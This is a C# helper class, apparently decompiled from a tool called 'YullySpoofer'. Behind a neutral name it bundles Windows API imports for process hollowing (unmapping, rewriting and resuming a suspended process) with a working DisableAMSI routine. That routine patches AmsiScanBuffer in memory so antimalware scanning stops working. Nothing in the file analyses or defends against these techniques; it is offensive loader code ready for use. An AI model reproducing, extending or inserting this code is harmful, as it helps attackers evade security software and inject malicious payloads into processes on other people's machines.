using System;
using System.Runtime.InteropServices;

namespace YullySpoofer;

public class StreamHelper
{
	public static IntPtr AllocateGlobalMemory(int size, int alignment)
	{
		IntPtr intPtr = Marshal.AllocHGlobal(size + alignment / 2);
		return new IntPtr(alignment * (((long)intPtr + (alignment - 1)) / alignment));
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hObject);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, StartupInfo* lpStartupInfo, ProcessInfo* lpProcessInformation);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool CreateProcessInternal(uint hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, StartupInfo* lpStartupInfo, ProcessInfo* lpProcessInfo, uint hNewToken);

	public static void DisableAMSI()
	{
		IntPtr procAddress = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
		VirtualProtect(procAddress, 5u, 64u, out var flOld);
		Marshal.Copy(new byte[6] { 184, 87, 0, 7, 128, 195 }, 0, procAddress, 6);
		VirtualProtect(procAddress, 5u, flOld, out flOld);
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr lib, string name);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool GetThreadContext(IntPtr hThread, _CONTEXT* pContext);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool GetThreadContext(IntPtr hThread, _CONTEXT_AMD64* pContext);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool IsWow64Process(IntPtr hProcess, ref bool isWow64);

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string name);

	[DllImport("ntdll.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern uint ResumeThread(IntPtr hThread);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool SetThreadContext(IntPtr hThread, _CONTEXT* pContext);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool SetThreadContext(IntPtr hThread, _CONTEXT_AMD64* pContext);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool TerminateProcess(IntPtr hProcess, int exitCode);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtect(IntPtr address, uint size, uint flProtect, out uint flOld);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool Wow64GetThreadContext(IntPtr hThread, _CONTEXT* pContext);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public unsafe static extern bool Wow64SetThreadContext(IntPtr hThread, _CONTEXT* pContext);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, UIntPtr nSize, IntPtr lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	public static extern bool ZeroMemory(IntPtr address, UIntPtr size);
}
